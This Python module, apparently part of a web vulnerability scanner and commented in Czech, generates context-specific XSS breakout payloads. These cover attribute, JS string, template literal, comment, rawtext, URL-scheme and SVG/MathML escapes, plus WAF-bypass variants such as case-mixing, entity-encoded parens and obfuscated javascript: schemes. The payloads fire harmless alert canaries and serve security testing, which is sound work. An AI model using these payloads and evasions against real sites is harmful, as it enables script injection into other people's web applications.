"""
_breakout_synth.py — grammar-driven XSS breakout synthesis (v10.34)

Místo aby fuzzer aplikoval generické string transformace a doufal, tady
SYNTETIZUJEME přesnou breakout sekvenci z naparsovaného kontextu
(ReflectionContext z context_engine): víme, jestli jsme v double-quoted
atributu, v single-quoted JS stringu, v template literalu, v <script> rawtextu,
v HTML komentáři, v href URL nebo v srcdoc — a podle toho emitujeme minimální
přesný únik + self-firing exec primitive.

Banka carrierů a exec primitiv je laděná na 2025-2026 (broad-tag self-firing
handlery, slash-místo-mezery, backtick exec, entity parens, javascript: scheme
obfuskace). Vše je čistá funkce → plně unit-testovatelné bez sítě.

Hlavní API:
    from_reflection_context(rc, canary="1", limit=24) -> List[(technique, payload)]
    synthesize(context, sub_context, *, tag, attr, quote, canary, limit) -> [...]
    verify_breakout(payload, breakout_required) -> bool   # self-check
"""
import base64
from typing import List, Tuple, Optional, Set, Any

# ── Exec primitiva (důkaz spuštění). alert/confirm/prompt — headless je hookuje.
def _ex_list(canary: str) -> List[str]:
    return [f"alert({canary})", f"confirm({canary})", f"prompt({canary})"]

# ── Self-firing carriery (spustí se BEZ interakce) — moderní broad-tag sada.
#    {ex} = exec primitive slot. Pořadí = priorita (nejspolehlivější první).
CARRIERS: List[Tuple[str, str]] = [
    ("svg_onload",        "<svg onload={ex}>"),
    ("svg_slash_onload",  "<svg/onload={ex}>"),          # slash místo mezery
    ("img_onerror",       "<img src=x onerror={ex}>"),
    ("img_slash_onerror", "<img/src/onerror={ex}>"),
    ("body_onload",       "<body onload={ex}>"),
    ("input_autofocus",   "<input autofocus onfocus={ex}>"),
    ("select_autofocus",  "<select autofocus onfocus={ex}><option>"),
    ("details_ontoggle",  "<details open ontoggle={ex}>"),
    ("marquee_onstart",   "<marquee onstart={ex}>"),
    ("video_src_onerror", "<video><source onerror={ex}>"),
    ("svg_animate",       "<svg><animate onbegin={ex} attributeName=x dur=1s>"),
    ("iframe_onload",     "<iframe onload={ex}>"),
]


def _carriers(ex: str, n: int) -> List[Tuple[str, str]]:
    """Vrátí prvních n carrierů naplněných exec primitivem ex."""
    return [(name, tpl.format(ex=ex)) for name, tpl in CARRIERS[:n]]


# ══════════════════════════════════════════════════════════════════════════
# Breakout sekvence per kontext
# ══════════════════════════════════════════════════════════════════════════

def _new_tag(ex: str, n: int = 6) -> List[Tuple[str, str]]:
    """Kontext, kde stačí otevřít nový tag (html_text, attr_name, rawtext-other)."""
    return [(f"newtag/{name}", payload) for name, payload in _carriers(ex, n)]


def _attr_breakout(quote: Optional[str], ex: str,
                   exec_list: List[str], n: int = 5) -> List[Tuple[str, str]]:
    """Únik z hodnoty atributu. Dvě strategie:
       (1) zavřít tag uvozovkou a otevřít nový tag-carrier,
       (2) zůstat v tagu a přidat self-firing handler (autofocus/onfocus)."""
    out: List[Tuple[str, str]] = []
    q = quote or ""           # unquoted → prázdný únik (stačí mezera/>)
    # Strategie 1: close-tag + carrier
    if quote:
        for name, carrier in _carriers(ex, n):
            out.append((f"attr_close/{name}", f"{q}>{carrier}"))
    else:
        # unquoted: nejdřív mezera+> pak carrier
        for name, carrier in _carriers(ex, n):
            out.append((f"attr_unq_close/{name}", f"><{carrier[1:]}"))  # už má <
    # Strategie 2: stay-in-tag self-firing handler (přežije i bez nového tagu)
    out.append((f"attr_stayfocus",
                f'{q} autofocus onfocus={ex} x={q}'))
    out.append((f"attr_staypointer",
                f'{q} onpointerover={ex} x={q}'))
    return out


def _event_handler_breakout(ex: str) -> List[Tuple[str, str]]:
    """Reflexe UVNITŘ onX="..." — jsme přímo v JS, stačí ukončit příkaz."""
    return [
        ("evt_semi",      f";{ex};//"),
        ("evt_dquote",    f'";{ex};//'),
        ("evt_squote",    f"';{ex};//"),
        ("evt_paren",     f"){ex}//"),
        ("evt_raw",       f"{ex}"),
    ]


def _url_breakout(ex: str) -> List[Tuple[str, str]]:
    """href/src/action/formaction — scheme injection + 2025 obfuskace."""
    return [
        ("url_js",          f"javascript:{ex}"),
        ("url_js_comment",  f"javascript:{ex}//"),
        ("url_js_entcolon", f"javascript&colon;{ex}"),     # entity colon (HTML decode)
        ("url_js_tab",      f"java\tscript:{ex}"),         # tab uvnitř scheme
        ("url_js_newline",  f"java\nscript:{ex}"),
        ("url_js_case",     f"jAvAsCrIpT:{ex}"),
        ("url_data_html",   f"data:text/html,<svg onload={ex}>"),
        # v10.78 fix: build the base64 from the LIVE canary — the old hardcoded
        # literal decoded to a fixed `<svg onload=alert(1)>` and ignored `ex`, so
        # for any canary other than '1' the probe fired a mismatched payload and
        # the reflection was never confirmed.
        ("url_data_b64",
         "data:text/html;base64," + base64.b64encode(
             f"<svg onload={ex}>".encode("utf-8")).decode("ascii")),
    ]


def _srcdoc_breakout(quote: Optional[str], ex: str,
                     n: int = 4) -> List[Tuple[str, str]]:
    """iframe srcdoc — obsah je HTML v atributu; tagy se píšou entity-encoded
       (obchází i WAF body inspection — WAF nevidí <script>)."""
    out: List[Tuple[str, str]] = []
    q = quote or '"'
    for name, carrier in _carriers(ex, n):
        enc = carrier.replace("<", "&lt;").replace(">", "&gt;")
        out.append((f"srcdoc_ent/{name}", enc))
        out.append((f"srcdoc_break/{name}",
                    f'{q}><iframe srcdoc={q}{enc}{q}>'))
    return out


def _js_string_breakout(quote: str, ex: str) -> List[Tuple[str, str]]:
    """Reflexe v JS stringu '..' / ".." — únik uvozovkou + ukončení výrazu."""
    q = quote
    return [
        ("js_str_concat",  f"{q}-{ex}-{q}"),
        ("js_str_semi",    f"{q};{ex};//"),
        ("js_str_block",   f"{q};{ex};/*"),
        ("js_str_close",   f"{q}}};{ex};//"),       # když jsme v {…} / fn těle
        ("js_str_plus",    f"{q}+{ex}+{q}"),
    ]


def _js_template_breakout(ex: str) -> List[Tuple[str, str]]:
    """Template literal `…HERE…` — ${} expr nebo únik backtickem."""
    return [
        ("tmpl_expr",     "${" + ex + "}"),
        ("tmpl_close",    f"`;{ex};//"),
        # v10.78 fix: was a byte-identical copy of tmpl_expr, so _dedupe dropped
        # it and the template-literal context lost a distinct breakout. This
        # closes the literal, concatenates the expression, and reopens.
        ("tmpl_concat",   "`+" + ex + "+`"),
    ]


def _js_direct_breakout(ex: str) -> List[Tuple[str, str]]:
    """Raw JS pozice (executable / template_expr / identifier / property_key)."""
    return [
        ("js_raw",   f"{ex}"),
        ("js_semi",  f";{ex};"),
        ("js_comma", f",{ex},"),
    ]


def _comment_breakout(ex: str, n: int = 4) -> List[Tuple[str, str]]:
    """HTML komentář <!-- HERE --> — zavřít komentář a otevřít tag."""
    out: List[Tuple[str, str]] = []
    for name, carrier in _carriers(ex, n):
        out.append((f"cmt_close/{name}", f"--><{carrier[1:]}"))
        out.append((f"cmt_bang/{name}",  f"--!><{carrier[1:]}"))
    return out


def _rawtext_breakout(tag: Optional[str], ex: str,
                      n: int = 4) -> List[Tuple[str, str]]:
    """<script>/<style>/<textarea>/<title> rawtext — zavřít tag a injektovat."""
    t = (tag or "script").lower()
    out: List[Tuple[str, str]] = []
    for name, carrier in _carriers(ex, n):
        out.append((f"raw_close/{name}",  f"</{t}>{carrier}"))
        out.append((f"raw_case/{name}",   f"</{t.upper()}>{carrier}"))
    return out


def _foreign_break(ex: str) -> List[Tuple[str, str]]:
    """v10.82 DEPTH: SVG/MathML foreign-content namespace escape. A reflection
    inside <svg>/<math> needs to CLOSE the foreign element (or hit an HTML
    integration point) so the injected <img onerror> is parsed in the HTML
    namespace and fires — a bare <svg onload=…> nested as an SVG child is inert.
    These carriers are inert outside svg/math (nothing to close), so they are
    harmless when the reflection is ordinary HTML text — the executability gate /
    live browser drops the ones that don't reflect a real closing tag."""
    prim = f"<img src=x onerror={ex}>"
    return [
        ("svg_close",       f"</svg>{prim}"),
        ("svg_text_close",  f"</text></svg>{prim}"),
        ("math_close",      f"</mtext></math>{prim}"),
        ("svg_foreignobj",  f"<foreignObject>{prim}</foreignObject>"),
    ]


# ══════════════════════════════════════════════════════════════════════════
# Dispatch
# ══════════════════════════════════════════════════════════════════════════

def synthesize(context: str, sub_context: str, *,
               tag: Optional[str] = None,
               attr: Optional[str] = None,
               quote: Optional[str] = None,
               canary: str = "1",
               limit: int = 24) -> List[Tuple[str, str]]:
    """Vrátí seřazený seznam (technique, payload) přesně cílený na daný kontext."""
    exl = _ex_list(canary)
    ex = exl[0]
    out: List[Tuple[str, str]] = []
    ctx, sub = (context or "").lower(), (sub_context or "").lower()

    if ctx in ("html_text", "html_attr_name"):
        out += _new_tag(ex)
        # v10.82 DEPTH: also try foreign-content (SVG/MathML) namespace escapes.
        # Inert when the reflection is plain HTML (nothing to close), but the
        # winning carrier when it lands inside <svg>/<math> where a bare new tag
        # is an inert foreign child.
        out += _foreign_break(ex)
    elif ctx == "html_attr":
        if sub == "attr_event_handler":
            out += _event_handler_breakout(ex)
        elif sub == "attr_url":
            out += _url_breakout(ex)
        elif sub == "attr_srcdoc":
            out += _srcdoc_breakout(quote, ex)
        elif sub == "attr_style":
            out += _attr_breakout(quote, ex, exl)   # CSS expression mrtvá → break tag
        else:  # attr_value_double/single/unquoted
            out += _attr_breakout(quote, ex, exl)
    elif ctx == "js":
        if sub == "js_string_double":
            out += _js_string_breakout('"', ex)
        elif sub == "js_string_single":
            out += _js_string_breakout("'", ex)
        elif sub in ("js_template_literal",):
            out += _js_template_breakout(ex)
        elif sub in ("js_executable", "js_template_expr",
                     "js_identifier", "js_property_key"):
            out += _js_direct_breakout(ex)
        else:
            out += _js_direct_breakout(ex)
    elif ctx == "html_comment":
        out += _comment_breakout(ex)
    elif ctx == "html_rawtext":
        out += _rawtext_breakout(tag, ex)
    elif ctx == "url":
        out += _url_breakout(ex)
    elif ctx == "css":
        # v10.82 DEPTH: Context.CSS is ALWAYS a reflection inside a <style> BLOCK
        # (a style="…" attribute classifies as HTML_ATTR, not CSS). JS only runs
        # there after a </style> escape — the old _attr_breakout (a quote breakout
        # for attributes) could NEVER produce it, so <style>-block XSS was
        # un-synthesized on the targeted path. Emit the </style> rawtext carriers.
        out += _rawtext_breakout("style", ex)
    else:
        # neznámý kontext → konzervativně zkus nový tag (nejčastější)
        out += _new_tag(ex)

    # přidej variantu s druhým exec primitivem u top-3 (diverzita dialogu)
    ex2 = exl[1]
    extra = []
    for name, p in out[:3]:
        extra.append((f"{name}/confirm", p.replace(ex, ex2)))
    out += extra

    return _dedupe(out)[:limit]


def from_reflection_context(rc: Any, canary: str = "1",
                            limit: int = 24) -> List[Tuple[str, str]]:
    """Adapter: vytáhne pole z context_engine.ReflectionContext (duck-typed)."""
    try:
        ctx = rc.context.value if hasattr(rc.context, "value") else str(rc.context)
        sub = rc.sub_context.value if hasattr(rc.sub_context, "value") else str(rc.sub_context)
        ev = getattr(rc, "evidence", None)
        tag = getattr(ev, "element_tag", None) if ev else None
        attr = getattr(ev, "attribute_name", None) if ev else None
        quote = getattr(ev, "quote_char", None) if ev else None
    except Exception:
        return []
    return synthesize(ctx, sub, tag=tag, attr=attr, quote=quote,
                      canary=canary, limit=limit)


# ══════════════════════════════════════════════════════════════════════════
# Modern WAF expansion (struktura-zachovávající 2025-26 obfuskace)
# ══════════════════════════════════════════════════════════════════════════

def _zigzag_case(s: str) -> str:
    """Case-mix ONLY HTML tag names and attribute/handler names — those are
    case-insensitive and are exactly what WAF signatures match (script, svg,
    onerror). v10.78 fix: the old version mixed EVERY alpha char, which
    corrupted case-SENSITIVE content — JS identifiers (`alert`→`AlErT` is not a
    function), the `javascript:` scheme, and base64 bodies — turning the whole
    case-mix bypass class into inert, non-executing payloads. Anything from a
    value delimiter (=, :, quote, `(`) onward, and any scheme/base64 payload, is
    left byte-for-byte untouched."""
    low = s.lower()
    if "base64," in low or s.lstrip().lower().startswith(("javascript:", "data:")):
        return s   # scheme/base64 body — case is significant, never touch it
    out = []
    in_tag = False       # between < and >
    name_mode = False    # currently over a tag/attr NAME (safe to case-mix)
    up = True
    for ch in s:
        if ch == "<":
            in_tag = True
            name_mode = True
            out.append(ch)
        elif ch == ">":
            in_tag = False
            name_mode = False
            out.append(ch)
        elif in_tag and ch.isspace():
            name_mode = True        # an attribute name may follow
            out.append(ch)
        elif in_tag and ch in "=(:\"'`":
            name_mode = False       # entering a VALUE → stop mixing
            out.append(ch)
        elif name_mode and ch.isalpha():
            out.append(ch.upper() if up else ch.lower())
            up = not up
        else:
            out.append(ch)
    return "".join(out)


def waf_expand(payload: str, *, in_attr_exec: bool = False) -> List[Tuple[str, str]]:
    """Pro daný (syntetizovaný) payload vrátí pár moderních WAF-bypass variant,
    které ZACHOVÁVAJÍ strukturu (nepoškodí breakout boundary)."""
    out: List[Tuple[str, str]] = [("base", payload)]
    # 1) backtick exec — bez závorek (obchází regex hledající alert\()
    if "(1)" in payload:
        out.append(("backtick", payload.replace("(1)", "`1`")))
    # 2) entity parens — validní v HTML attribute/handler/URL exec
    if in_attr_exec and "(1)" in payload:
        out.append(("entity_parens", payload.replace("(1)", "&lpar;1&rpar;")))
    # 3) case-mix tag/handler jmen (jen ascii písmena, struktura beze změny)
    out.append(("case_mix", _zigzag_case(payload)))
    return _dedupe(out)


# ══════════════════════════════════════════════════════════════════════════
# Self-check
# ══════════════════════════════════════════════════════════════════════════

def verify_breakout(payload: str, breakout_required) -> bool:
    """Ověří, že payload emituje VŠECHNY required breakout znaky RAW
    (neescapované) NEBO jejich HTML-entity ekvivalent — protože v HTML
    dekódujících kontextech (attribute value, href, text) prohlížeč entitu
    dekóduje PŘED parsingem schématu/tagu, takže `&colon;` reálně funguje
    jako `:`. Levný sanity check — synth payload bez nutného úniku je bug."""
    if not breakout_required:
        return True
    low = payload.lower()
    for ch in breakout_required:
        if ch == " ":
            if " " not in payload and "/" not in payload:
                return False
            continue
        forms = _ENTITY_EQUIV.get(ch, [ch])
        if not any(f.lower() in low for f in forms):
            return False
    return True


# raw znak → akceptované formy (raw + HTML entity) pro verify_breakout
_ENTITY_EQUIV = {
    ":": [":", "&colon;", "&#58;", "&#x3a;"],
    "(": ["(", "&lpar;", "&#40;"],
    ")": [")", "&rpar;", "&#41;"],
    "<": ["<", "&lt;", "&#60;", "&#x3c;"],
    ">": [">", "&gt;", "&#62;", "&#x3e;"],
    '"': ['"', "&quot;", "&#34;"],
    "'": ["'", "&apos;", "&#39;"],
}


def _dedupe(pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
    seen, out = set(), []
    for name, p in pairs:
        if p in seen:
            continue
        seen.add(p)
        out.append((name, p))
    return out
